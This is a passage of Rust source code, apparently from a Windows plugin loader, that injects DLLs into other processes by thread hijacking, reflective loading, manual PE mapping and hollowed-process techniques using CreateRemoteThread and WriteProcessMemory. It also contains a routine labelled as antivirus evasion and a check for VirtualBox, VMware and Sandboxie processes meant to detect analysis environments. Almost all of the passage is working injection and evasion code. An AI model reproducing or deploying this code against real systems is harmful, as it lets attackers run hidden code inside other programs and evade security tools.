                    let virt_free_ex = VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
                    println!("VirtualFreeEx: {virt_free_ex:?}");
                    CloseHandle(h_thread).ok();
                    CloseHandle(h_process).ok();
                    anyhow::anyhow!("GetModuleHandleA failed: {}", e)
                })?;
            let load_library_addr = GetProcAddress(kernel32, PCSTR(b"LoadLibraryA\0".as_ptr()))
                .ok_or_else(|| {
                    ResumeThread(h_thread);
                    let virt_free_ex = VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
                    println!("VirtualFreeEx: {virt_free_ex:?}");
                    CloseHandle(h_thread).ok();
                    CloseHandle(h_process).ok();
                    anyhow::anyhow!("LoadLibraryA not found")
                })?;

            // Save original RIP and set new one
            let original_rip = context.Rip;
            context.Rip = load_library_addr as u64;
            context.Rcx = path_alloc as u64; // First parameter for LoadLibraryA

            // Set the modified context
            SetThreadContext(h_thread, &context)
                .map_err(|e| {
                    ResumeThread(h_thread);
                    let virt_free_ex = VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
                    println!("VirtualFreeEx: {virt_free_ex:?}");
                    CloseHandle(h_thread).ok();
                    CloseHandle(h_process).ok();
                    anyhow::anyhow!("SetThreadContext failed: {}", e)
                })?;

            // Resume thread to execute LoadLibraryA
            ResumeThread(h_thread);

            // Wait a bit for the DLL to load
            std::thread::sleep(std::time::Duration::from_millis(500));

            // Suspend again and restore original RIP
            SuspendThread(h_thread);
            context.Rip = original_rip;
            SetThreadContext(h_thread, &context)
                .map_err(|e| anyhow::anyhow!("SetThreadContext restore failed: {}", e))?;
            ResumeThread(h_thread);

            // Clean up
            VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE)?;
            CloseHandle(h_thread).ok();
            CloseHandle(h_process).ok();

            println!("Thread hijacking injection completed for PID {}", pid.as_u32());
            Ok(())
        }
    }

    // Reflective DLL injection implementation
    pub async unsafe fn inject_reflective_dll(
        pid: sysinfo::Pid,
        plugin_dir: &str,
        plugin: &str,
        function: &str
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            let dll_path = format!("{}\\{}", plugin_dir, plugin);
            let dll_data = std::fs::read(&dll_path).map_err(|e| anyhow::anyhow!("Failed to read DLL file {}: {}", dll_path, e))?;

            let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE.into(), pid.as_u32())
                .map_err(|e| anyhow::anyhow!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;

            // Parse PE and get required info
            let (preferred_base, _entry_rva, size_of_image) = Self::parse_pe_headers(&dll_data)?;

            // Allocate memory for the DLL
            let alloc = VirtualAllocEx(
                h_process,
                None,
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                CloseHandle(h_process).ok();
                return Err(anyhow::anyhow!("VirtualAllocEx failed for reflective injection in PID {} - insufficient privileges or protected process", pid.as_u32()));
            }

            let actual_base = alloc as usize;

            // Map PE sections
            if let Err(e) = Self::map_pe_sections(&dll_data, h_process, alloc) {
                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                CloseHandle(h_process).ok();
                return Err(anyhow::anyhow!("Failed to map PE sections: {}", e));
            }

            // Apply relocations
            if actual_base != preferred_base {
                if let Err(e) = Self::apply_relocations(&dll_data, h_process, actual_base, preferred_base) {
                    VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                    CloseHandle(h_process).ok();
                    return Err(anyhow::anyhow!("Failed to apply relocations: {}", e));
                }
            }

            // Resolve imports
            if let Err(e) = Self::resolve_imports(&dll_data, h_process, alloc) {
                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                CloseHandle(h_process).ok();
                return Err(anyhow::anyhow!("Failed to resolve imports: {}", e));
            }

            // Call DllMain manually if needed
            let dll_main_rva = Self::get_dll_main_rva(&dll_data)?;
            if dll_main_rva > 0 {
                let dll_main_addr = actual_base + dll_main_rva as usize;
                let thread_handle = CreateRemoteThread(
                    h_process,
                    None,
                    0,
                    Some(std::mem::transmute(dll_main_addr)),
                    Some(1 as *mut _), // DLL_PROCESS_ATTACH
                    0,
                    None,
                ).map_err(|e| anyhow::anyhow!("Failed to call DllMain: {}", e))?;

                WaitForSingleObject(thread_handle, INFINITE);
                CloseHandle(thread_handle).ok();
            }

            // Now call the exported function
            let function_rva = Self::get_export_rva(&dll_data, function)?;
            let function_addr = actual_base + function_rva as usize;

            let thread_handle = CreateRemoteThread(
                h_process,
                None,
                0,
                Some(std::mem::transmute(function_addr)),
                None,
                0,
                None,
            ).map_err(|e| anyhow::anyhow!("Failed to create remote thread for function {}: {}", function, e))?;

            WaitForSingleObject(thread_handle, INFINITE);
            CloseHandle(thread_handle).ok();
            CloseHandle(h_process).ok();

            Ok(())
        }
    }

    // Manual mapping with full IAT fixups
    /*
    pub async unsafe fn inject_manual_map(
        pid: sysinfo::Pid,
        plugin_dir: &str,
        plugin: &str,
        function: &str
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            let dll_path = format!("{}\\{}", plugin_dir, plugin);
            let dll_data = std::fs::read(&dll_path).map_err(|e| anyhow::anyhow!("Failed to read DLL file {}: {}", dll_path, e))?;

            let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE.into(), pid.as_u32())
                .map_err(|e| anyhow::anyhow!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;

            // Parse PE headers
            let (preferred_base, _entry_rva, size_of_image) = Self::parse_pe_headers(&dll_data)?;

            // Try to allocate at preferred base
            let mut alloc = VirtualAllocEx(
                h_process,
                Some(preferred_base as *mut _),
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                // Fallback allocation
                alloc = VirtualAllocEx(
                    h_process,
                    None,
                    size_of_image,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                if alloc.is_null() {
                    CloseHandle(h_process).ok();
                    return Err(anyhow::anyhow!("VirtualAllocEx failed for manual mapping in PID {} - insufficient privileges or protected process", pid.as_u32()));
                }
            }

            let actual_base = alloc as usize;

            // Map all PE sections with proper alignment
            if let Err(e) = Self::map_pe_sections_aligned(&dll_data, h_process, alloc) {
                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                CloseHandle(h_process).ok();
                return Err(anyhow::anyhow!("Failed to map PE sections: {}", e));
            }

            // Apply relocations if needed
            if actual_base != preferred_base {
                if let Err(e) = Self::apply_relocations(&dll_data, h_process, alloc, preferred_base, actual_base) {
                    VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                    CloseHandle(h_process).ok();
                    return Err(anyhow::anyhow!("Failed to apply relocations: {}", e));
                }
            }

            // Comprehensive IAT resolution
            if let Err(e) = Self::resolve_imports_comprehensive(&dll_data, h_process, alloc) {
                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                CloseHandle(h_process).ok();
                return Err(anyhow::anyhow!("Failed to resolve imports: {}", e));
            }

            // Set proper memory protections
            if let Err(e) = Self::set_section_protections(&dll_data, h_process, alloc) {
                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                CloseHandle(h_process).ok();
                return Err(anyhow::anyhow!("Failed to set section protections: {}", e));
            }

            // Call the target function
            let function_rva = Self::get_export_rva(&dll_data, function)?;
            let function_addr = actual_base + function_rva as usize;

            let thread_handle = CreateRemoteThread(
                h_process,
                None,
                0,
                Some(std::mem::transmute(function_addr)),
                None,
                0,
                None,
            ).map_err(|e| anyhow::anyhow!("Failed to create remote thread for function {}: {}", function, e))?;

            WaitForSingleObject(thread_handle, INFINITE);
            CloseHandle(thread_handle).ok();
            CloseHandle(h_process).ok();

            Ok(())
        }
    }
    */
    
    // Basic AV evasion techniques
    pub async unsafe fn apply_basic_evasion() -> anyhow::Result<(), anyhow::Error> {
        // Random delays
        let delay = rand::random::<u64>() % 500 + 100;
        tokio::time::sleep(std::time::Duration::from_millis(delay)).await;

        // Optional: Check for analysis environments (disabled by default for user-friendliness)
        // if Self::detect_analysis_environment() {
        //     return Err("Analysis environment detected".to_string());
        // }

        Ok(())
    }

    // Helper function to detect analysis environments
    fn detect_analysis_environment() -> bool {
        unsafe {
            // Check for common VM/sandbox indicators
            let indicators = [
                "VBoxService.exe",
                "vmtoolsd.exe", 
                "vmsrvc.exe",
                "vboxservice.exe",
                "sandboxiedcomlaunch.exe",
                "sbiesvc.exe",
            ];

            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if let Ok(snapshot) = snapshot {
                let mut entry = PROCESSENTRY32 {
                    dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
                    ..Default::default()
                };

                if Process32First(snapshot, &mut entry).is_ok() {
                    loop {
                        let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr())
                            .to_string_lossy()
                            .to_lowercase();
                        
                        for indicator in &indicators {
                            if name.contains(&indicator.to_lowercase()) {
                                return true;
                            }
                        }

                        if !Process32Next(snapshot, &mut entry).is_ok() {
                            break;
                        }
                    }
                }
            }
        }
        false
    }

    // Find a thread suitable for hijacking
    fn find_hijackable_thread(pid: u32) -> anyhow::Result<u32, anyhow::Error> {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
                .map_err(|e| anyhow::anyhow!("CreateToolhelp32Snapshot failed: {}", e))?;

            let mut entry = THREADENTRY32 {
                dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
                ..Default::default()
            };

            if Thread32First(snapshot, &mut entry).is_ok() {
                loop {
                    if entry.th32OwnerProcessID == pid {
                        // Found a thread belonging to our target process
                        return Ok(entry.th32ThreadID);
                    }
                    if !Thread32Next(snapshot, &mut entry).is_ok() {
                        break;
                    }
                }
            }

            Err(anyhow::anyhow!("No suitable thread found for hijacking"))
        }
    }

    pub unsafe fn inject_hollowed_process(    
        dll_data: &[u8],
        process_handle: HANDLE,
        function_name: &str,
        _pid: u32
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            // let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid.as_u32())
            // .map_err(|e| format!("OpenProcess failed: {}", e))?;

            // Extract the RVA of the desired export function (e.g., "DllMain")
            let load_rva = Self::get_export_rva(dll_data, function_name)?;

            // Parse preferred base from PE header (supporting PE32 and PE32+)
            let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
            let optional_header = &dll_data[e_lfanew + 0x18..];
            let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());

            let preferred_base = if magic == 0x10B {
                u32::from_le_bytes(optional_header[0x1C..0x20].try_into().unwrap()) as usize
            } else {
                u64::from_le_bytes(optional_header[0x18..0x20].try_into().unwrap()) as usize
            };

            // Allocate memory in the target process at preferred base
            let alloc = VirtualAllocEx(
                process_handle,
                Some(preferred_base as *mut _),
                dll_data.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                return Err(anyhow::anyhow!("VirtualAllocEx failed"));
            }

            // Write DLL headers and sections
            WriteProcessMemory(process_handle, alloc, dll_data.as_ptr() as _, dll_data.len(), None)
                .map_err(|e| anyhow::anyhow!("WriteProcessMemory failed: {}", e))?;

            // Calculate remote entry point address by adding base + RVA
            let entry_point = (alloc as usize).wrapping_add(load_rva as usize);

            // Create remote thread at entry point
            let thread_handle = CreateRemoteThread(
                process_handle,
                None,
                0,
                Some(std::mem::transmute(entry_point)),
                None,
                0,
                None,
            )?;

            if thread_handle.is_invalid() {
                return Err(anyhow::anyhow!("CreateRemoteThread failed"));
            }

            println!("Wrote {} bytes to remote process at {:p}", dll_data.len(), alloc);
            let mut verify = vec![0u8; dll_data.len()];
            ReadProcessMemory(process_handle, alloc, verify.as_mut_ptr() as _, dll_data.len(), None)?;
            
            if verify == dll_data {
                println!("Remote memory matches injected DLL image");
            } else {
               return Err(anyhow::anyhow!("WARNING: Remote memory does not match!"));
            }
            // let process = OwnedProcess::from_pid(pid).map_err(|e| e.to_string())?;
            // let syringe = Syringe::for_process(process);
            // let injected = syringe.inject(&path).map_err(|e| e.to_string())?;
            // ProcessModule::new_local_unchecked(handle)
            // let remote_proc = syringe
            //     .get_raw_procedure::<extern "system" fn() -> i32>(injected, function)
            //     .map_err(|e| e.to_string())?
            //     .ok_or("Procedure not found")?;

            // Wait until the user clicks OK and the thread exits
            WaitForSingleObject(thread_handle, INFINITE);

            CloseHandle(thread_handle)?;

            Ok(())
        }
    }

    pub unsafe fn call_exported_fn(
        plugin_name: String, 
        path: String, 
        function: String, 
        pid: u32,
        tx: Sender<String>
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            let data = std::fs::read(&path)?;
            let rva = PluginApp::get_export_rva(&data, &function).map_err(|e| anyhow::anyhow!("{e}"))?;
            
            let base = Self::get_remote_module_base(pid, &plugin_name)
                .ok_or(anyhow::anyhow!("DLL not found in remote process"))?;
            
            let remote_addr = (base as usize + rva as usize) as *mut std::ffi::c_void;
            
            let h_process = OpenProcess(
                PROCESS_ALL_ACCESS, 
                FALSE.into(), 
                pid
            )?;
            
            if h_process.is_invalid() {
                return Err(anyhow::anyhow!("Failed to open process"));
            }
            
            let handle = CreateRemoteThread(
                h_process, 
                None, 
                0, 
                Some(std::mem::transmute(remote_addr)), 
                None, 
                0, 
                None
            )?;

            if handle.is_invalid() {
                return Err(anyhow::anyhow!("CreateRemoteThread failed"));
            }
            tokio::spawn(async move {
                tx.send(format!("Called '{}'", function)).ok();
            });
        }
        Ok(())
    }

    pub async unsafe fn inject_dll(pid: sysinfo::Pid, plugin_dir: &str, plugin: &str, function: &str) -> anyhow::Result<(), anyhow::Error> {
        let path = format!("{}\\{}", plugin_dir, plugin);
        println!("Injecting DLL: {} into PID: {}", path, pid);
        
        let process = OwnedProcess::from_pid(pid.as_u32()).map_err(|e| anyhow::anyhow!("Failed to access process PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
        let syringe = Syringe::for_process(process);
        let injected = syringe.inject(&path).map_err(|e| anyhow::anyhow!("DLL injection failed for {}: {} (ensure DLL exists and is valid)", path, e))?;
        println!("DLL injected successfully");
        
        unsafe {
            let remote_proc = syringe
                .get_raw_procedure::<extern "system" fn() -> i32>(injected, function)
                .map_err(|e| anyhow::anyhow!("Failed to get procedure {}: {}", function, e))?
                .ok_or(anyhow::anyhow!("Procedure {} not found in DLL", function))?;
            let result = remote_proc.call().map_err(|e| anyhow::anyhow!("Failed to call function {}: {}", function, e))?;
            println!("{} returned: {}", function, result);
        }
        Ok(())
    }

    // Legacy process hollowing - replaced by improved version
    pub async unsafe fn inject_dll_alt_legacy(_pid: sysinfo::Pid, plugin_dir: String, plugin: String) -> anyhow::Result<(), String> {

        Err("This function has been deprecated. Use the new injection methods.".to_string())
    }

    pub fn get_remote_module_base(pid: u32, module_name: &str) -> Option<*mut std::ffi::c_void> {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid).ok()?;
            let mut entry = MODULEENTRY32 {
                dwSize: std::mem::size_of::<MODULEENTRY32>() as u32,
                ..Default::default()
            };

            if Module32First(snapshot, &mut entry).is_ok() {
                loop {
                    let name = std::ffi::CStr::from_ptr(entry.szModule.as_ptr())
                        .to_string_lossy()
                        .to_lowercase();
                    if name == module_name.to_lowercase() {
                        return Some(entry.modBaseAddr as _);
                    }
                    if !Module32Next(snapshot, &mut entry).is_ok() {
                        break;
                    }
                }
            }
            None
        }
    }

    /// Parses PE headers to get essential information for mapping.
    fn parse_pe_headers(pe_data: &[u8]) -> anyhow::Result<(usize, u32, usize)> {
        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let optional_header = unsafe { &(*nt_headers_ptr).OptionalHeader };

        let image_base = optional_header.ImageBase as usize;
        let entry_rva = optional_header.AddressOfEntryPoint;
        let size_of_image = optional_header.SizeOfImage as usize;

        Ok((image_base, entry_rva, size_of_image))
    }

    /// Maps the PE headers and sections into the target process.
    fn map_pe_sections(pe_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<()> {
        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let optional_header = unsafe { &(*nt_headers_ptr).OptionalHeader };
        let file_header = unsafe { &(*nt_headers_ptr).FileHeader };

        // Write headers
        unsafe { WriteProcessMemory(process_handle, base_addr, pe_data.as_ptr() as _, optional_header.SizeOfHeaders as usize, None) }?;

        // Write sections
        let sections_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        let sections = unsafe { std::slice::from_raw_parts(sections_ptr, file_header.NumberOfSections as usize) };

        for section in sections {
            if section.SizeOfRawData > 0 {
                let dest_addr = (base_addr as usize + section.VirtualAddress as usize) as *mut c_void;
                let src_addr = (pe_data.as_ptr() as usize + section.PointerToRawData as usize) as *const c_void;
                unsafe { WriteProcessMemory(process_handle, dest_addr, src_addr, section.SizeOfRawData as usize, None) }?;
            }
        }
        Ok(())
    }

    /// Applies base relocations to the mapped image.
    fn apply_relocations(pe_data: &[u8], process_handle: HANDLE, new_base: usize, preferred_base: usize) -> anyhow::Result<()> {
        let delta = new_base.wrapping_sub(preferred_base);
        if delta == 0 { return Ok(()); }

        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let optional_header = unsafe { &(*nt_headers_ptr).OptionalHeader };

        let reloc_dir = optional_header.DataDirectory[5]; // IMAGE_DIRECTORY_ENTRY_BASERELOC
        if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 { return Ok(()); }

        let mut reloc_offset = rva_to_offset(pe_data, reloc_dir.VirtualAddress as usize)?;
        let reloc_end = reloc_offset + reloc_dir.Size as usize;

        while reloc_offset < reloc_end {
            let page_rva = u32::from_le_bytes(pe_data[reloc_offset..reloc_offset + 4].try_into()?);
            let block_size = u32::from_le_bytes(pe_data[reloc_offset + 4..reloc_offset + 8].try_into()?);
            if block_size == 0 { break; }

            let entries_count = (block_size as usize - 8) / 2;
            for i in 0..entries_count {
                let entry_offset = reloc_offset + 8 + i * 2;
                let entry = u16::from_le_bytes(pe_data[entry_offset..entry_offset + 2].try_into()?);
                let reloc_type = entry >> 12;
                let offset_in_page = entry & 0xFFF;
                let reloc_addr = new_base + page_rva as usize + offset_in_page as usize;

                match reloc_type {
                    3 => { // IMAGE_REL_BASED_HIGHLOW (32-bit)
                        let mut original_value = 0u32;
                        unsafe { ReadProcessMemory(process_handle, reloc_addr as *const _, &mut original_value as *mut _ as *mut c_void, 4, None) }?;
                        let new_value = original_value.wrapping_add(delta as u32);
                        unsafe { WriteProcessMemory(process_handle, reloc_addr as *mut _, &new_value as *const _ as *const c_void, 4, None) }?;
                    },
                    10 => { // IMAGE_REL_BASED_DIR64 (64-bit)
                        let mut original_value = 0u64;
                        unsafe { ReadProcessMemory(process_handle, reloc_addr as *const _, &mut original_value as *mut _ as *mut c_void, 8, None) }?;
                        let new_value = original_value.wrapping_add(delta as u64);
                        unsafe { WriteProcessMemory(process_handle, reloc_addr as *mut _, &new_value as *const _ as *const c_void, 8, None) }?;
                    },
                    0 => {}, // IMAGE_REL_BASED_ABSOLUTE (skip)
                    _ => println!("[reloc][warn] Unhandled relocation type: {}", reloc_type),
                }
            }
            reloc_offset += block_size as usize;
        }
        Ok(())
    }

    fn resolve_imports(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr()))
                .map_err(|e| anyhow::anyhow!("GetModuleHandleA failed for kernel32: {}", e))?;
            let load_library_addr = GetProcAddress(kernel32, PCSTR(b"LoadLibraryA\0".as_ptr()))
                .ok_or(anyhow::anyhow!("GetProcAddress failed for LoadLibraryA"))?;

            let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
            let optional_header = &dll_data[e_lfanew + 0x18..];
            let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());

            let import_rva = if magic == 0x10B {
                u32::from_le_bytes(optional_header[0x80..0x84].try_into().unwrap()) as usize
            } else {
                u32::from_le_bytes(optional_header[0x90..0x94].try_into().unwrap()) as usize
            };

            if import_rva == 0 {
                return Ok(()); // No imports
            }

            let import_offset = Self::rva_to_offset(dll_data, import_rva)
                .map_err(|e| anyhow::anyhow!("Invalid import table RVA: {}", e))?;

            let mut current_offset = import_offset;
            loop {
                let original_first_thunk = u32::from_le_bytes(dll_data[current_offset..current_offset + 4].try_into().unwrap()) as usize;
                let name_rva = u32::from_le_bytes(dll_data[current_offset + 12..current_offset + 16].try_into().unwrap()) as usize;
                let first_thunk = u32::from_le_bytes(dll_data[current_offset + 16..current_offset + 20].try_into().unwrap()) as usize;

                if name_rva == 0 {
                    break; // End of import table
                }

                // Get DLL name
                let name_offset = Self::rva_to_offset(dll_data, name_rva)
                    .map_err(|e| anyhow::anyhow!("Invalid DLL name RVA: {}", e))?;
                let dll_name_end = dll_data[name_offset..].iter().position(|&b| b == 0).unwrap_or(0);
                let dll_name = std::str::from_utf8(&dll_data[name_offset..name_offset + dll_name_end])
                    .map_err(|e| anyhow::anyhow!("Invalid DLL name: {}", e))?;

                // Load the DLL in remote process
                println!("[hollow/exe] Loading DLL in remote: {}", dll_name);
                let dll_name_str = format!("{}\0", dll_name);
                let remote_name = VirtualAllocEx(
                    process_handle,
                    None,
                    dll_name_str.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );
                if remote_name.is_null() {
                    return Err(anyhow::anyhow!("VirtualAllocEx failed for remote DLL name"));
                }
                if let Err(e) = WriteProcessMemory(
                    process_handle,
                    remote_name,
                    dll_name_str.as_ptr() as _,
                    dll_name_str.len(),
                    None,
                ) {
                    VirtualFreeEx(process_handle, remote_name, 0, MEM_RELEASE);
                    return Err(anyhow::anyhow!("WriteProcessMemory failed for remote DLL name: {}", e));
                }
                let thread_handle = CreateRemoteThread(
                    process_handle,
                    None,
                    0,
                    Some(std::mem::transmute(load_library_addr)),
                    Some(remote_name),
                    0,
                    None,
                ).map_err(|e| anyhow::anyhow!("CreateRemoteThread failed for LoadLibraryA: {}", e))?;
                WaitForSingleObject(thread_handle, INFINITE);
                CloseHandle(thread_handle);
                VirtualFreeEx(process_handle, remote_name, 0, MEM_RELEASE);

                // Load the DLL in current process to resolve imports
                println!("[hollow/exe] Loading DLL in current: {}", dll_name);
                let h_module = GetModuleHandleA(PCSTR(format!("{}\0", dll_name).as_ptr()))
                    .or_else(|_| {
                        println!("[hollow/exe] DLL not loaded, attempting to load: {}", dll_name);
                        LoadLibraryA(PCSTR(format!("{}\0", dll_name).as_ptr()))
                    })
                    .map_err(|e| anyhow::anyhow!("Failed to load {}: {}", dll_name, e))?;

                // Resolve function addresses
                let mut thunk_offset = Self::rva_to_offset(dll_data, first_thunk)
                    .map_err(|e| anyhow::anyhow!("Invalid first thunk RVA: {}", e))?;
                let mut iat_addr = (base_addr as usize + first_thunk) as *mut u64;

                loop {
                    let thunk_value = u64::from_le_bytes(dll_data[thunk_offset..thunk_offset + 8].try_into().unwrap());
                    if thunk_value == 0 {
                        break;
                    }

                    let func_addr = if thunk_value & 0x8000000000000000 != 0 {
                        // Import by ordinal
                        let ordinal = thunk_value & 0xFFFF;
                        GetProcAddress(h_module, PCSTR(ordinal as *const u8))
                    } else {
                        // Import by name
                        let name_table_rva = thunk_value as usize;
                        let name_table_offset = Self::rva_to_offset(dll_data, name_table_rva + 2)
                            .map_err(|e| anyhow::anyhow!("Invalid import name RVA: {}", e))?;
                        let func_name_end = dll_data[name_table_offset..].iter().position(|&b| b == 0).unwrap_or(0);
                        let func_name = std::str::from_utf8(&dll_data[name_table_offset..name_table_offset + func_name_end])
                            .map_err(|e| anyhow::anyhow!("Invalid function name: {}", e))?;
                        
                        GetProcAddress(h_module, PCSTR(format!("{}\0", func_name).as_ptr()))
                    };

                    if let Some(addr) = func_addr {
                        println!("[hollow/exe] Resolved function at: 0x{:X}", addr as usize);
                        WriteProcessMemory(
                            process_handle,
                            iat_addr as _,
                            &(addr as u64) as *const _ as _,
                            8,
                            None,
                        ).map_err(|e| anyhow::anyhow!("Failed to write IAT entry: {}", e))?;
                    } else {
                        println!("[hollow/exe] Failed to resolve function, leaving as zero");
                    }

                    thunk_offset += 8;
                    iat_addr = iat_addr.add(1);
                }

                current_offset += 20; // Size of IMAGE_IMPORT_DESCRIPTOR
            }

            Ok(())
        }
    }

    /// Sets the correct memory protections for each section of the mapped image.
    fn set_section_protections(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
            let optional_header = &dll_data[e_lfanew + 0x18..];
            let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());
            
            let number_of_sections = u16::from_le_bytes(dll_data[e_lfanew + 6..e_lfanew + 8].try_into().unwrap()) as usize;
            let section_table = e_lfanew + 24 + if magic == 0x10B { 96 } else { 112 };
            println!("Section table: {section_table}");

            // Get the total image size from the PE header for bounds checking
            let dos_header = &*(dll_data.as_ptr() as *const IMAGE_DOS_HEADER);
            let nt_headers_ptr = (dll_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
            let optional_header = &(*nt_headers_ptr).OptionalHeader;
            let size_of_image = optional_header.SizeOfImage as usize;

            println!("Allocated image range: 0x{:X} - 0x{:X}", base_addr as usize, base_addr as usize + size_of_image);
            for i in 0..number_of_sections {
                let section_offset = section_table + i * 40;
                let name = &dll_data[section_offset..section_offset+8];
                let name_bytes = name.iter().cloned().take_while(|&b| b != 0).collect::<Vec<u8>>();
                let name_str = String::from_utf8_lossy(&name_bytes);
                let misc = u32::from_le_bytes(dll_data[section_offset + 8..section_offset + 12].try_into().unwrap());
                let virtual_size = misc;
                let virtual_address = u32::from_le_bytes(dll_data[section_offset + 12..section_offset + 16].try_into().unwrap()) as usize;
                let raw_size = u32::from_le_bytes(dll_data[section_offset + 16..section_offset + 20].try_into().unwrap()) as usize;
                let raw_ptr = u32::from_le_bytes(dll_data[section_offset + 20..section_offset + 24].try_into().unwrap());
                let relocs_ptr = u32::from_le_bytes(dll_data[section_offset + 24..section_offset + 28].try_into().unwrap());
                let linenums_ptr = u32::from_le_bytes(dll_data[section_offset + 28..section_offset + 32].try_into().unwrap());
                let num_relocs = u16::from_le_bytes(dll_data[section_offset + 32..section_offset + 34].try_into().unwrap());
                let num_linenums = u16::from_le_bytes(dll_data[section_offset + 34..section_offset + 36].try_into().unwrap());
                let characteristics = u32::from_le_bytes(dll_data[section_offset + 36..section_offset + 40].try_into().unwrap());

                println!("Section {}: name='{}' offset=0x{:X}", i, name_str, section_offset);
                println!("  virtual_address=0x{:X}", virtual_address);
                println!("  virtual_size=0x{:X}", virtual_size);
                println!("  raw_size=0x{:X}", raw_size);
                println!("  raw_ptr=0x{:X}", raw_ptr);
                println!("  relocs_ptr=0x{:X}", relocs_ptr);
                println!("  linenums_ptr=0x{:X}", linenums_ptr);
                println!("  num_relocs=0x{:X}", num_relocs);
                println!("  num_linenums=0x{:X}", num_linenums);
                println!("  characteristics=0x{:X}", characteristics);

                // Use the larger of VirtualSize or SizeOfRawData, but never zero
                let size = std::cmp::max(virtual_size as usize, raw_size);

                // Stricter bounds and discardable check
                if size == 0 {
                    println!("[protect] Skipping section {}: zero size", i);
                    continue;
                }
                if virtual_address == 0 {
                    println!("[protect] Skipping section {}: zero virtual address", i);
                    continue;
                }
                if virtual_address + size > size_of_image {
                    println!("[protect] Skipping section {}: out-of-bounds (addr=0x{:X}, size=0x{:X}, image=0x{:X})", i, virtual_address, size, size_of_image);
                    continue;
                }
                if size > 0x1000000 {
                    println!("[protect] Skipping section {}: absurd size (0x{:X})", i, size);
                    continue;
                }
                if characteristics & 0x02000000 != 0 {
                    println!("[protect] Skipping section {}: discardable", i);
                    continue;
                }

                let protection = if characteristics & 0x20000000 != 0 { // IMAGE_SCN_MEM_EXECUTE
                    if characteristics & 0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
                        PAGE_EXECUTE_READWRITE
                    } else {
                        PAGE_EXECUTE_READ
                    }
                } else if characteristics & 0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
                    PAGE_READWRITE
                } else {
                    PAGE_READONLY
                };

                println!("protection: {:X}", protection.0);

                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                let remote_addr = (base_addr as usize + virtual_address) as *mut _;
                println!("Calling VirtualProtectEx: addr=0x{:X}, size=0x{:X}, protection=0x{:X}", remote_addr as usize, size, protection.0);
                VirtualProtectEx(
                    process_handle,
                    remote_addr,
                    size,
                    protection,
                    &mut old_protect,
                )
                .context("VirtualProtectEx")
                .map_err(|e| anyhow::anyhow!("Error with VirtualProtectEx: {e:?}"))?;
            }

            Ok(())
        }
    }

    fn get_dll_main_rva(dll_data: &[u8]) -> anyhow::Result<u32, anyhow::Error> {
